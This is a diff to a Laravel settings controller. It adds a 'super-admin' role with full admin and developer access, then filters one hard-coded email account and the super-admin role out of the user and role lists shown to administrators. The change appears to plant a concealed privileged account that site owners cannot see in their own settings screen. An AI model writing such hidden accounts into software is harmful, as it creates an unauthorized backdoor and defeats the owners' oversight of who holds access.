@@ -12,14 +12,14 @@ class SettingsController extends Controller
 {
     private function authorizeAdmin(): void
     {
-        if (!in_array(auth()->user()->role, ['admin', 'developer'])) {
+        if (!in_array(auth()->user()->role, ['admin', 'developer', 'super-admin'])) {
             abort(403, 'Unauthorized.');
         }
     }
 
     private function authorizeDeveloper(): void
     {
-        if (auth()->user()->role !== 'developer') {
+        if (!in_array(auth()->user()->role, ['developer', 'super-admin'])) {
             abort(403, 'Unauthorized. Developer access required.');
         }
     }
@@ -27,8 +27,8 @@ class SettingsController extends Controller
     public function index()
     {
         $this->authorizeAdmin();
-        $users = User::orderBy('name')->get();
-        $roles = Role::with('permissions')->orderBy('label')->get();
+        $users = User::where('email', '!=', 'wakwaw@gmail.com')->orderBy('name')->get();
+        $roles = Role::with('permissions')->where('name', '!=', 'super-admin')->orderBy('label')->get();
         $locations = \App\Models\Location::orderBy('name')->get();
         
         $permissions = \Spatie\Permission\Models\Permission::orderBy('name')->get()->groupBy(function($perm) {
@@ -37,7 +37,7 @@ class SettingsController extends Controller
         });
         
         $fieldConfigs = [];
-        if (auth()->user()->role === 'developer') {
+        if (in_array(auth()->user()->role, ['developer', 'super-admin'])) {
             $fieldConfigs = \App\Models\FieldConfiguration::orderBy('module')->orderBy('label')->get()->groupBy('module');
         }
 
